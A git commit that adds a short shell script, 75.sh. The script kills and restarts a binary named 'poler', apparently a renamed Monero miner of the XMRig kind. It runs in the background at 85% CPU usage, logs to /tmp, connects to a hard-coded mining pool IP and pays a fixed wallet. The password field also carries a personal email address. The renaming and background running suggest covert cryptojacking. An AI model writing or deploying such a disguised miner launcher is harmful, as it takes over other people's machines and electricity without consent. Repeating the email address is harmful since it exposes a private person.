49ad9d6f6a1ffc8ea0c0590aa405c150ce4d9c40
WilliamWizard <41175651+WilliamWizard@users.noreply.github.com>
2019-06-07 20:21:55 +0300

    w13

---
+++ 75.sh
@@ -0,0 +1,3 @@
+pkill poler
+sleep 7
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 85 --cpu-priority 3 -o 94.103.94.11:5992 -u 49CbkXPhxYucb9hrGevFByNd5nGQ66BmdiRUUaUdkQtY1AW3G8qVrruFFkUCuyEDjnJfbcnhCfprBH3t3Luc4tN97AvbYh3 --pass=w13-shusstriy:ivanovandrey1984g@gmail.com -k
